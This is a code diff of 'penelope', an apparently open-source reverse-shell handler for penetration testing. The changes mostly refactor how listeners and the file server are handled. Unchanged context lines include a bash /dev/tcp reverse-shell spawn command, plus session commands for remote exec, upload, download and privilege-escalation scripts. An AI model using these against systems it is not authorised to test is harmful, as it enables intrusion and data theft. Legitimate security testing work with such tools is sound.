@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.13.6"
+__version__ = "0.13.8"
 
 import os
 import io
@@ -280,7 +280,7 @@ class Size:
 				_bytes = num * 1024 ** __class__.units.index(unit)
 			except:
 				logger.error("Invalid size specified")
-				sys.exit()
+				return # TEMP
 		return cls(_bytes)
 
 
@@ -735,8 +735,8 @@ class MainMenu(BetterCMD):
 		return ""
 
 	@staticmethod
-	def sessions(text, *extra):
-		options = list(map(str, core.sessions))
+	def get_core_id_completion(text, *extra, attr='sessions'):
+		options = list(map(str, getattr(core, attr)))
 		options.extend(extra)
 		return [option for option in options if option.startswith(text)]
 
@@ -751,7 +751,7 @@ class MainMenu(BetterCMD):
 				f"{session_part}{paint('>').cyan_DIM} "
 		)
 
-	def session(current=False, extra=[]):
+	def session_operation(current=False, extra=[]):
 		def inner(func):
 			@wraps(func)
 			def newfunc(self, ID):
@@ -826,7 +826,7 @@ class MainMenu(BetterCMD):
 					)
 		else:
 			for section in self.commands:
-				print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
+				print(f'\n{paint(section).yellow}\n{paint("─" * len(section)).cyan}')
 				table = Table(joinchar=' · ')
 				for command in self.commands[section]:
 					parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
@@ -834,7 +834,7 @@ class MainMenu(BetterCMD):
 				print(table)
 			print()
 
-	@session(extra=['none'])
+	@session_operation(extra=['none'])
 	def do_use(self, ID):
 		"""
 		[SessionID|none]
@@ -889,7 +889,7 @@ class MainMenu(BetterCMD):
 				cmdlogger.warning("No sessions yet 😟")
 				print()
 
-	@session()
+	@session_operation()
 	def do_interact(self, ID):
 		"""
 		[SessionID]
@@ -902,7 +902,7 @@ class MainMenu(BetterCMD):
 		"""
 		return core.sessions[ID].attach()
 
-	@session(extra=['*'])
+	@session_operation(extra=['*'])
 	def do_kill(self, ID):
 		"""
 		[SessionID|*]
@@ -931,7 +931,7 @@ class MainMenu(BetterCMD):
 			logger.info("Penelope exited due to Single Session mode")
 			return True
 
-	@session(current=True)
+	@session_operation(current=True)
 	def do_portfwd(self, line):
 		"""
 		host:port(<-|->)host:port
@@ -995,7 +995,7 @@ class MainMenu(BetterCMD):
 
 		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport))
 
-	@session(current=True)
+	@session_operation(current=True)
 	def do_download(self, remote_items):
 		"""
 		<glob>...
@@ -1013,7 +1013,7 @@ class MainMenu(BetterCMD):
 		else:
 			cmdlogger.warning("No files or directories specified")
 
-	@session(current=True)
+	@session_operation(current=True)
 	def do_open(self, remote_items):
 		"""
 		<glob>...
@@ -1042,7 +1042,7 @@ class MainMenu(BetterCMD):
 		else:
 			cmdlogger.warning("No files or directories specified")
 
-	@session(current=True)
+	@session_operation(current=True)
 	def do_upload(self, local_items):
 		"""
 		<glob|URL>...
@@ -1063,7 +1063,7 @@ class MainMenu(BetterCMD):
 		else:
 			cmdlogger.warning("No files or directories specified")
 
-	@session(current=True)
+	@session_operation(current=True)
 	def do_script(self, local_item):
 		"""
 		<local_script|URL>
@@ -1094,7 +1094,7 @@ class MainMenu(BetterCMD):
 				table += [paint(module.__name__).red, description]
 			print(indent(str(table), '  '), "\n", sep="")
 
-	@session(current=True)
+	@session_operation(current=True)
 	def do_run(self, line):
 		"""
 		[module name]
@@ -1111,7 +1111,7 @@ class MainMenu(BetterCMD):
 		else:
 			self.show_modules()
 
-	@session(current=True)
+	@session_operation(current=True)
 	def do_spawn(self, line):
 		"""
 		[Port] [Host]
@@ -1174,7 +1174,7 @@ class MainMenu(BetterCMD):
 			status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint('Disabled').white_RED
 			cmdlogger.info(f"Value set to {paint(options.maintain).yellow} {status}")
 
-	@session(current=True)
+	@session_operation(current=True)
 	def do_upgrade(self, ID):
 		"""
 
@@ -1192,7 +1192,7 @@ class MainMenu(BetterCMD):
 		Open(folder)
 		print(folder)
 
-	@session(current=True)
+	@session_operation(current=True)
 	def do_exec(self, cmdline):
 		"""
 		<remote command>
@@ -1219,7 +1219,7 @@ class MainMenu(BetterCMD):
 		else:
 			cmdlogger.warning("No command to execute")
 
-	'''@session(current=True) # TODO
+	'''@session_operation(current=True) # TODO
 	def do_tasks(self, line):
 		"""
 
@@ -1264,53 +1264,50 @@ class MainMenu(BetterCMD):
 			listeners stop 0.0.0.0 4444	Stop the Listener on 0.0.0.0:4444
 		"""
 		if line:
+			parser = ArgumentParser(prog="listeners")
+			subparsers = parser.add_subparsers(dest="command", required=True)
+
+			parser_add = subparsers.add_parser("add", help="Add a new listener")
+			parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
+			parser_add.add_argument("-p", "--port", help="Port to listen on", default=options.default_listener_port)
+			parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')
+
+			parser_stop = subparsers.add_parser("stop", help="Stop a listener")
+			parser_stop.add_argument("id", help="Listener ID to stop")
+
 			try:
-				subcommand, host, port = line.split(" ")
-				port = int(port)
-
-			except ValueError:
-				try:
-					subcommand, host = line.split(" ")
-					if subcommand == "stop" and host == "*":
-						listeners = core.listeners.copy()
-						if listeners:
-							for listener in listeners.values():
-								listener.stop()
-						else:
-							cmdlogger.warning("No listeners to stop...")
-							return False
-						return
-
-				except ValueError:
-					pass
-
-				print()
-				cmdlogger.error("Invalid HOST - PORT combination")
-				self.onecmd("help listeners")
+				args = parser.parse_args(line.split())
+			except SystemExit:
 				return False
 
-			if subcommand == "add":
-				Listener(host, port)
+			if args.command == "add":
+				if args.type == 'tcp':
+					TCPListener(args.interface, args.port)
 
-			elif subcommand == "stop":
-				host = Interfaces().translate(host)
-				for listener in core.listeners.values():
-					if (listener.host, listener.port) == (host, port):
-						listener.stop()
-						break
+			elif args.command == "stop":
+				if args.id == '*':
+					listeners = core.listeners.copy()
+					if listeners:
+						for listener in listeners.values():
+							listener.stop()
+					else:
+						cmdlogger.warning("No listeners to stop...")
+						return False
 				else:
-					cmdlogger.warning("No such Listener...")
-			else:
-				print()
-				cmdlogger.error("Invalid subcommand")
-				self.onecmd("help listeners")
-				return False
+					try:
+						core.listeners[int(args.id)].stop()
+					except (KeyError, ValueError):
+						logger.error("Invalid Listener ID")
+
 		else:
 			if core.listeners:
+				table = Table(joinchar=' | ')
+				table.header = [paint(header).red for header in ('ID', 'Type', 'Host', 'Port')]
 				for listener in core.listeners.values():
-					print(listener)
+					table += [listener.id, listener.__class__.__name__, listener.host, listener.port]
+				print('\n', indent(str(table), '  '), '\n', sep='')
 			else:
-				cmdlogger.warning("No registered Listeners...")
+				cmdlogger.warning("No active Listeners...")
 
 	def do_connect(self, line):
 		"""
@@ -1454,33 +1451,32 @@ class MainMenu(BetterCMD):
 		return [option for option in options.__dict__ if option.startswith(text)]
 
 	def complete_listeners(self, text, line, begidx, endidx):
-		subcommands = ["add", "stop"]
-		if begidx == 10:
-			return [command for command in subcommands if command.startswith(text)]
-		if begidx == 14:
+		last = -2 if text else -1
+		arg = line.split()[last]
+
+		if arg == 'listeners':
+			return [command for command in ["add", "stop"] if command.startswith(text)]
+		elif arg in ('-i', '--interface'):
 			return [iface_ip for iface_ip in Interfaces().list_all + ['any', '0.0.0.0'] if iface_ip.startswith(text)]
-		if begidx == 15:
-			listeners = [re.search(r'\((.*)\)', str(listener))[1].replace(':', ' ') for listener in core.listeners]
-			if len(listeners) > 1:
-				listeners.append('*')
-			return [listener for listener in listeners if listener.startswith(text)]
-		if begidx > 15:
-			...#print(line, text)
+		elif arg in ('-t', '--type'):
+			return [_type for _type in ("tcp",) if _type.startswith(text)]
+		elif arg == 'stop':
+			return self.get_core_id_completion(text, "*", attr='listeners')
 
 	def complete_upload(self, text, line, begidx, endidx):
 		return __class__.file_completer(text)
 
 	def complete_use(self, text, line, begidx, endidx):
-		return self.sessions(text, "none")
+		return self.get_core_id_completion(text, "none")
 
 	def complete_sessions(self, text, line, begidx, endidx):
-		return self.sessions(text)
+		return self.get_core_id_completion(text)
 
 	def complete_interact(self, text, line, begidx, endidx):
-		return self.sessions(text)
+		return self.get_core_id_completion(text)
 
 	def complete_kill(self, text, line, begidx, endidx):
-		return self.sessions(text, "*")
+		return self.get_core_id_completion(text, "*")
 
 	def complete_run(self, text, line, begidx, endidx):
 		return [module.__name__ for module in modules().values() if module.__name__.startswith(text)]
@@ -1593,7 +1589,7 @@ class Core:
 					break
 
 				# The listeners
-				elif readable.__class__ is Listener:
+				elif readable.__class__ is TCPListener:
 					_socket, endpoint = readable.socket.accept()
 					thread_name = f"NewCon{endpoint}"
 					logger.debug(f"New thread: {thread_name}")
@@ -1805,7 +1801,7 @@ def Connect(host, port):
 
 	return False
 
-class Listener:
+class TCPListener:
 
 	def __init__(self, host=None, port=None):
 		self.host = host or options.default_interface
@@ -1820,7 +1816,7 @@ class Listener:
 			self.start()
 
 	def __str__(self):
-		return f"Listener({self.host}:{self.port})"
+		return f"TCPListener({self.host}:{self.port})"
 
 	def __bool__(self):
 		return hasattr(self, 'id')
@@ -3304,7 +3300,7 @@ class Session:
 			with open(tempfile_bat, "w") as f:
 				f.write(cmd)
 
-			server = FileServer(host=self._host, password=rand(8), quiet=True)
+			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
 			urlpath_bat = server.add(tempfile_bat)
 			temp_remote_file_bat = urlpath_bat.split("/")[-1]
 			server.start()
@@ -3566,7 +3562,7 @@ class Session:
 						myzip.write(item, arcname=altname)
 					altnames.append(altname)
 
-			server = FileServer(host=self._host, password=rand(8), quiet=True)
+			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
 			urlpath_zip = server.add(tempfile_zip)
 
 			cwd_escaped = self.cwd.replace('\\', '\\\\')
@@ -3671,7 +3667,7 @@ class Session:
 				host = host or self._host
 
 				if not next((listener for listener in core.listeners.values() if listener.port == port), None):
-					new_listener = Listener(host, port)
+					new_listener = TCPListener(host, port)
 
 				if self.bin['bash']:
 					cmd = f'echo -n "{self.bin["setsid"]} {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"|{self.bin["bash"]}'
@@ -4273,9 +4269,12 @@ class peass_ng(Module):
 		Run the latest version of PEASS-ng in the background
 		"""
 		if session.OS == 'Unix':
-			parser = ArgumentParser(description="peass-ng module", add_help=False)
+			parser = ArgumentParser(prog='peass_ng', description="peass-ng module", add_help=False)
 			parser.add_argument("-a", "--ai", help="Analyze linpeas results with chatGPT", action="store_true")
-			arguments = parser.parse_args(shlex.split(args))
+			try:
+				arguments = parser.parse_args(shlex.split(args))
+			except SystemExit:
+				return
 			if arguments.ai:
 				try:
 					from openai import OpenAI
@@ -4396,12 +4395,12 @@ class ngrok(Module):
 
 
 class FileServer:
-	def __init__(self, *items, port=None, host=None, password=None, quiet=False):
+	def __init__(self, *items, port=None, host=None, url_prefix=None, quiet=False):
 		self.port = port or options.default_fileserver_port
 		self.host = host or options.default_interface
 		self.host = Interfaces().translate(self.host)
 		self.items = items
-		self.password = password + '/' if password else ''
+		self.url_prefix = url_prefix + '/' if url_prefix else ''
 		self.quiet = quiet
 		self.filemap = {}
 		for item in self.items:
@@ -4409,7 +4408,7 @@ class FileServer:
 
 	def add(self, item):
 		if item == '/':
-			self.filemap[f'/{self.password}[root]'] = '/'
+			self.filemap[f'/{self.url_prefix}[root]'] = '/'
 			return '/[root]'
 
 		item = os.path.abspath(normalize_path(item))
@@ -4424,7 +4423,7 @@ class FileServer:
 				if _item == item:
 					return _urlpath
 
-		urlpath = f"/{self.password}{os.path.basename(item)}"
+		urlpath = f"/{self.url_prefix}{os.path.basename(item)}"
 		while urlpath in self.filemap:
 			root, ext = os.path.splitext(urlpath)
 			urlpath = root + '_' + ext
@@ -4448,7 +4447,7 @@ class FileServer:
 			ips = [ip for ip in Interfaces().list.values()]
 
 		for ip in ips:
-			output.extend(('', '🏠 http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).red) + '/' + self.password))
+			output.extend(('', '🏠 http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).red) + '/' + self.url_prefix))
 			table = Table(joinchar=' → ')
 			for urlpath, filepath in self.filemap.items():
 				table += (
@@ -4464,7 +4463,7 @@ class FileServer:
 		threading.Thread(target=self._start).start()
 
 	def _start(self):
-		filemap, host, port, password, quiet = self.filemap, self.host, self.port, self.password, self.quiet
+		filemap, host, port, url_prefix, quiet = self.filemap, self.host, self.port, self.url_prefix, self.quiet
 
 		class CustomTCPServer(socketserver.TCPServer):
 			allow_reuse_address = True
@@ -4494,7 +4493,7 @@ class FileServer:
 		class CustomHandler(SimpleHTTPRequestHandler):
 			def do_GET(self):
 				try:
-					if self.path == '/' + password:
+					if self.path == '/' + url_prefix:
 						response = ''
 						for path in filemap.keys():
 							response += f'<li><a href="{path}">{path}</a></li>'
@@ -4891,7 +4890,7 @@ def main():
 	misc = parser.add_argument_group("File server")
 	misc.add_argument("-s", "--serve", help="HTTP File Server mode", action="store_true")
 	misc.add_argument("-p", "--port", help="File Server port. Default: 8000", metavar='')
-	misc.add_argument("-pass", "--password", help="URL prefix", type=str, metavar='')
+	misc.add_argument("-prefix", "--url-prefix", help="URL prefix", type=str, metavar='')
 
 	debug = parser.add_argument_group("Debug")
 	debug.add_argument("-N", "--no-bins", help="Simulate binary absence on target (comma separated list)", metavar='')
@@ -4913,36 +4912,37 @@ def main():
 	global keyboard_interrupt
 	signal.signal(signal.SIGINT, lambda num, stack: core.stop())
 
-	# Version
+	# Show Version
 	if options.version:
 		print(__version__)
-		return
+		sys.exit()
 
-	# Interfaces
+	# Show Interfaces
 	elif options.interfaces:
 		print(Interfaces())
-		return
+		sys.exit()
 
-	# Interfaces
+	# Check hardcoded URLs
 	elif options.check_urls:
 		signal.signal(signal.SIGINT, signal.SIG_DFL)
 		check_urls()
-		return
+		sys.exit()
 
 	# Main Menu
 	elif options.menu:
 		signal.signal(signal.SIGINT, keyboard_interrupt)
 		menu.show()
-		return True
+		menu.start()
+		sys.exit()
 
 	# File Server
 	elif options.serve:
-		server = FileServer(*options.ports or '.', port=options.port, host=options.interface, password=options.password)
+		server = FileServer(*options.ports or '.', port=options.port, host=options.interface, url_prefix=options.url_prefix)
 		if server.filemap:
 			server.start()
 		else:
 			logger.error("No files to serve")
-		return
+		sys.exit()
 
 	if not options.ports:
 		options.ports.append(options.default_listener_port)
@@ -4951,24 +4951,23 @@ def main():
 		# Bind shell
 		if options.connect:
 			if not Connect(options.connect, port):
-				return
+				sys.exit(1)
 		# Reverse Listener
 		else:
-			Listener(host=options.interface, port=port)
+			TCPListener(host=options.interface, port=port)
 			if not core.listeners:
-				return
-
+				sys.exit(1)
 	listener_menu()
 	signal.signal(signal.SIGINT, keyboard_interrupt)
-	return True
-
+	menu.start()
+	sys.exit()
 
 #################### PROGRAM LOGIC ####################
 
 # Check Python version
 if not sys.version_info >= (3, 6):
 	print("(!) Penelope requires Python version 3.6 or higher (!)")
-	sys.exit()
+	sys.exit(1)
 
 # Apply default options
 options = Options()
@@ -5059,6 +5058,7 @@ except ImportError:
 core = Core()
 menu = MainMenu(histfile=options.cmd_histfile, histlen=options.histlength)
 start = menu.start
+Listener = TCPListener
 
 # Check for installed emojis
 if not fonts_installed():
@@ -5068,5 +5068,4 @@ if not fonts_installed():
 load_rc()
 
 if __name__ == "__main__":
-	if main():
-		menu.start()
+	main()
